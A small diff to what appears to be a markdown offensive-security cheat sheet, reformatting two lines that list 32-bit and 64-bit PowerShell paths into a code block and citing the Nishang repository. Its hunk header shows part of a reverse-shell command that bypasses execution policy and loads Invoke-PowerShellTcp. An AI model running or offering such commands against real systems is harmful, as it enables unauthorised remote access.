@@ -162,5 +162,7 @@ powershell -exec bypass -c Import-Module .\Invoke-PowerShellTcp.ps1;Invoke-Power
 ref : https://github.com/samratashok/nishang<br />
 
 Powershell location<br />
--32-bit (x86) PowerShell executable C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe <br />
--64-bit (x64) Powershell executable C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe <br />
+```sh 
+-32-bit (x86) PowerShell executable C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
+-64-bit (x64) Powershell executable C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe  
+```
